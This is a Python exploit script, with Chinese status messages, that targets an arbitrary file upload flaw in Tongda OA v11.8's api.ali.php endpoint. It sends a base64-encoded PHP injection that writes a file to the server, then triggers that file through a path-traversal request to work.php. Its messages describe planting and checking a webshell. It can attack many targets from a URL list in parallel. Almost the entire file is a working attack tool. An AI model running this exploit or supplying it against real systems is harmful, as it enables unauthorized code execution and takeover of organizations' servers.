import time
import argparse
import requests
import multiprocessing
import urllib3
from rich.console import Console

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

 
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        "Content-Type":"multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae"
        }
    headerx = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }  
    data='''{"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==","dataAnalysis":"{\"a\":\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"}"}'''
    data=data.encode("utf-8").decode("latin1")
    upload_url=target_url+'mobile/api/api.ali.php'
    exp_url=target_url+'inc/package/work.php?id=../../../../../myoa/attach/approve_center/2109/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4'
    console.print(now_time() + " [INFO]     正在检测通达OA v11.8 api.ali.php 任意文件上传漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(upload_url, headers=headers, data=data, verify=False)
        if upload.status_code == 200:
            console.print(now_time() + ' [SUCCESS]  上传webshell成功，检测wbshell中:{}'.format(exp_url), style='bold green')
            response=requests.get(exp_url, headers=headerx, verify=False)
            if response.status_code == 200 and '+ok' in response.text:
                console.print(now_time() + ' [SUCCESS]  webshell检测成果,冰蝎默认密码:{}'.format(exp_url), style='bold green')
            else:
                console.print(now_time() + ' [WARNING]  webshell上传失败，请手动检测:{}'.format(exp_url), style='bold red ')
        else:
            console.print(now_time() + ' [WARNING]  通达OA v11.8 api.ali.php 任意文件上传漏洞不存在', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
        
if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')